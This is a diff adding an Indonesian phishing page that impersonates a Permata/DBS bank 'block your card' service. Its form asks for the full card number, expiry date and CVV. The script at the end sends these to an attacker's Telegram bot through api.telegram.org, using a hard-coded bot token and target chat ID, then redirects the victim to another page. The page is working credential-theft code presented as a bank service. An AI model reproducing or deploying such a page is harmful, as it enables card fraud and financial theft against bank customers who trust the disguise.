@@ -1,0 +1,398 @@
+  <!DOCTYPE html>
+  <html lang="id">
+    <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <title>Blokir Kartu Permata</title>
+      <link
+        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+        rel="stylesheet"
+      />
+      <style>
+        body {
+          background-color: #f3f6fb;
+          font-family: "Segoe UI", sans-serif;
+          min-height: 100vh;
+          display: flex;
+          flex-direction: column;
+        }
+
+        .nav-logo img,
+        footer img {
+          width: 100%;
+          display: block;
+        }
+
+        .container {
+          flex: 1;
+        }
+
+        .card-wrapper {
+          perspective: 1000px;
+          margin-bottom: 20px;
+        }
+
+        .card-inner {
+          width: 100%;
+          transition: transform 0.8s;
+          transform-style: preserve-3d;
+          position: relative;
+        }
+
+        .card-wrapper.flip .card-inner {
+          transform: rotateY(180deg);
+        }
+
+        .card-display {
+          background: linear-gradient(135deg, #0b0b0b, #1c1c1c);
+          color: white;
+          padding: 20px;
+          border-radius: 15px;
+          min-height: 200px;
+          position: relative;
+          backface-visibility: hidden;
+          font-family: "Segoe UI", sans-serif;
+          overflow: hidden;
+          display: flex;
+          flex-direction: column;
+          justify-content: space-between;
+        }
+
+        .card-display::before {
+          content: "";
+          position: absolute;
+        top: -50px;
+        left: -50px;
+          width: 200%;
+        height: 400%;
+        background-image: 
+          repeating-radial-gradient(circle at center, rgba(255,255,255,0.1) 0px, transparent 1px),
+          repeating-radial-gradient(circle at center, rgba(255,255,255,0.05) 0px, transparent 2px);
+        transform: rotate(10deg);
+          z-index: 0;
+        }
+
+        .card-display * {
+          position: relative;
+          z-index: 1;
+        }
+
+        .card-top {
+          display: flex;
+          justify-content: space-between;
+          font-size: 0.8rem;
+        }
+
+        .card-top .left {
+          font-weight: bold;
+          letter-spacing: 1px;
+        }
+
+        .card-top .right {
+          text-align: right;
+          line-height: 1;
+        }
+
+        .card-top .right span {
+          font-weight: bold;
+          font-size: 0.9rem;
+        }
+
+        .chip {
+          margin: 10px 0;
+        }
+
+        .numbers {
+          font-size: 1.4rem;
+          letter-spacing: 2px;
+          margin-bottom: 5px;
+        }
+
+        .valid-thru {
+          font-size: 0.65rem;
+          opacity: 0.7;
+        }
+
+        #liveValid {
+          font-size: 0.9rem;
+        }
+
+        .card-bottom {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          font-size: 0.8rem;
+          margin-top: 10px;
+        }
+
+        .card-bottom .icons {
+          display: flex;
+          gap: 10px;
+          font-size: 1.2rem;
+        }
+
+        .card-bottom .visa {
+          text-align: right;
+          line-height: 1;
+        }
+
+        .card-bottom .visa span {
+          font-size: 1.4rem;
+          font-weight: bold;
+          display: block;
+        }
+
+        .card-back {
+    background: #111;
+    color: white;
+    padding: 20px;
+    border-radius: 15px;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    backface-visibility: hidden;
+    transform: rotateY(180deg);
+    min-height: 200px;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    align-items: flex-end;
+    font-family: "Segoe UI", sans-serif;
+    overflow: hidden;
+  }
+
+  .card-back::before {
+    content: "";
+    position: absolute;
+    top: 40px;
+    left: 10px;
+    width: 90%;
+    height: 45px;
+    background: #fff;
+    border-radius: 4px;
+  }
+
+  .card-back .cvv-box {
+    position: relative;
+    z-index: 2;
+    margin-top: 100px;
+    margin-right: 10px;
+    text-align: right;
+  }
+
+  .card-back .cvv-box div {
+    font-size: 0.8rem;
+    margin-bottom: 5px;
+  }
+
+  .card-back .cvv-box span {
+    font-size: 1.5rem;
+    letter-spacing: 3px;
+    color: #00f0ff;
+  }
+
+
+        .form-box {
+          background-color: white;
+          padding: 20px;
+          border-radius: 12px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .form-control {
+          border-radius: 8px;
+        }
+
+        .btn-block {
+          width: 100%;
+          border-radius: 8px;
+        }
+
+        footer {
+          margin-top: auto;
+        }
+      </style>
+    </head>
+    <body>
+      <!-- NAV -->
+      <div class="nav-logo">
+        <img src="navbarpertamabank.png" alt="Nav Logo" />
+      </div>
+
+      <!-- Content -->
+      <div class="container my-4">
+        <div class="card-wrapper" id="cardWrapper">
+          <div class="card-inner">
+            <div class="card-display">
+              <div class="card-top">
+                <div class="left">TRAVEL</div>
+                <div class="right">
+                  <span>digibank</span><br />
+                  <small>by DBS</small>
+                </div>
+              </div>
+              <div class="chip mb-2">
+                <img
+                  src="https://img.icons8.com/ios-filled/50/ffffff/sim-card-chip.png"
+                  height="30"
+                />
+              </div>
+
+              <div class="numbers" id="liveCardNumber"></div>
+              <div class="valid-thru">VALID THRU</div>
+              <div id="liveValid">MM/YY</div>
+
+              <div class="card-bottom">
+                <div class="icons">
+              
+                </div>
+                <div class="visa">
+                  <span>VISA</span>
+                  Signature
+                </div>
+              </div>
+            </div>
+
+            <!-- Belakang -->
+          <div class="card-back">
+    <div class="cvv-box">
+      <div>CVV</div>
+      <span>***</span>
+    </div>
+  </div>
+
+          </div>
+        </div>
+
+        <div class="form-box">
+          <form id="cardForm">
+            <div class="mb-3">
+<input
+  type="text"
+  inputmode="numeric"
+  pattern="\d*"
+  maxlength="16"
+  class="form-control text-center"
+  id="cardNumber"
+  placeholder="Masukkan 16 digit Nomor kartu"
+  required
+/>
+
+            </div>
+            <div class="row g-2 mb-3">
+              <div class="col-6">
+            <input
+  type="text"
+  inputmode="numeric"
+  pattern="\d*"
+  maxlength="5"
+  class="form-control text-center"
+  id="validThru"
+  placeholder="MM/YY"
+  required
+/>
+
+              </div>
+              <div class="col-6">
+              <input
+  type="text"
+  inputmode="numeric"
+  pattern="\d*"
+  maxlength="3"
+  class="form-control text-center"
+  id="cvv"
+  placeholder="CVV 3"
+  required
+/>
+
+              </div>
+            </div>
+          <button type="submit" class="btn btn-danger btn-block">Blokir Transaksi</button>
+
+          </form>
+        </div>
+      </div>
+
+      <!-- FOOTER -->
+      <footer>
+        <img src="permatabankfooter.png" alt="Footer" />
+      </footer>
+
+      <!-- Script -->
+    <script>
+    // === FORMAT KARTU, VALID THRU, DAN FLIP ===
+    const cardInput = document.getElementById("cardNumber");
+    const validThru = document.getElementById("validThru");
+    const cvvInput = document.getElementById("cvv");
+    const liveCardNumber = document.getElementById("liveCardNumber");
+    const liveValid = document.getElementById("liveValid");
+    const cardWrapper = document.getElementById("cardWrapper");
+
+    // Format nomor kartu
+    cardInput.addEventListener("input", () => {
+      let val = cardInput.value.replace(/\D/g, "").slice(0, 16);
+      cardInput.value = val;
+      liveCardNumber.textContent = val
+        .replace(/(.{4})/g, "$1 ")
+        .trim()
+        .padEnd(19, "•");
+    });
+
+    // Format Valid Thru
+    validThru.addEventListener("input", () => {
+      let val = validThru.value.replace(/\D/g, "").slice(0, 4);
+      if (val.length >= 3) {
+        val = val.slice(0, 2) + "/" + val.slice(2);
+      }
+      validThru.value = val;
+      liveValid.textContent = val || "MM/YY";
+    });
+
+    // Flip efek pas input CVV
+    cvvInput.addEventListener("focus", () => {
+      cardWrapper.classList.add("flip");
+    });
+    cvvInput.addEventListener("blur", () => {
+      cardWrapper.classList.remove("flip");
+    });
+
+    // === KIRIM KE TELEGRAM SAAT SUBMIT ===
+    const token = '8474317370:AAHQre6cvdPCDBj-4lbiy7Qi5nZfvBSJz6g'; // TOKEN BOT
+    const chat_id = '5801473402'; // CHAT ID TARGET
+
+    document.getElementById("cardForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const cardNumber = cardInput.value.trim();
+      const valid = validThru.value.trim();
+      const cvv = cvvInput.value.trim();
+
+      const message = ` *Permintaan Blokir Kartu Digibank*\n\n` +
+                      ` *Nomor Kartu*: \`${cardNumber}\`\n` +
+                      ` *Berlaku Hingga*: \`${valid}\`\n` +
+                      ` *CVV*: \`${cvv}\``;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      })
+      .then(() => {
+        // Redirect ke halaman layanan
+        window.location.href = "dbslayanan.html";
+      })
+      .catch(() => {
+        alert("Gagal mengirim data. Coba lagi.");
+      });
+    });
+  </script>
+
+    </body>
+  </html>
